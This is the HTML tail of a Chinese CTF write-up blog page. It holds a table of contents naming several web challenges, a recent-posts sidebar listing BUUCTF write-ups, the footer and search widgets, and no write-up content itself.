class="toc-text">[WEB]myblog</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB-rceme"><span class="toc-number">1.3.</span> <span class="toc-text">[WEB]rceme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB-FighterFightsInvincibly"><span class="toc-number">1.4.</span> <span class="toc-text">[WEB]FighterFightsInvincibly</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB-flagshop"><span class="toc-number">1.5.</span> <span class="toc-text">[WEB]flagshop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB-greatphp"><span class="toc-number">1.6.</span> <span class="toc-text">[WEB]greatphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB-cross"><span class="toc-number">1.7.</span> <span class="toc-text">[WEB]cross</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/04/21/BUUCTF-2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/" title="BUUCTF-2020极客大挑战"><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210502232517.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUCTF-2020极客大挑战"/></a><div class="content"><a class="title" href="/2021/04/21/BUUCTF-2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/" title="BUUCTF-2020极客大挑战">BUUCTF-2020极客大挑战</a><time datetime="2021-04-21T12:15:00.000Z" title="发表于 2021-04-21 20:15:00">2021-04-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/04/19/BUUCTF-2019%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/" title="BUUCTF-GYCTF2020"><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419210907.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUCTF-GYCTF2020"/></a><div class="content"><a class="title" href="/2021/04/19/BUUCTF-2019%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/" title="BUUCTF-GYCTF2020">BUUCTF-GYCTF2020</a><time datetime="2021-04-19T13:10:00.000Z" title="发表于 2021-04-19 21:10:00">2021-04-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/04/19/BUUCTF-GYCTF2020/" title="BUUCTF-GYCTF2020"><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210502232617.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUCTF-GYCTF2020"/></a><div class="content"><a class="title" href="/2021/04/19/BUUCTF-GYCTF2020/" title="BUUCTF-GYCTF2020">BUUCTF-GYCTF2020</a><time datetime="2021-04-19T13:10:00.000Z" title="发表于 2021-04-19 21:10:00">2021-04-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/04/18/The_first_blog/" title="This is the first blog"><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210418231820.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="This is the first blog"/></a><div class="content"><a class="title" href="/2021/04/18/The_first_blog/" title="This is the first blog">This is the first blog</a><time datetime="2021-04-18T12:21:57.275Z" title="发表于 2021-04-18 20:21:57">2021-04-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Virtua1</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
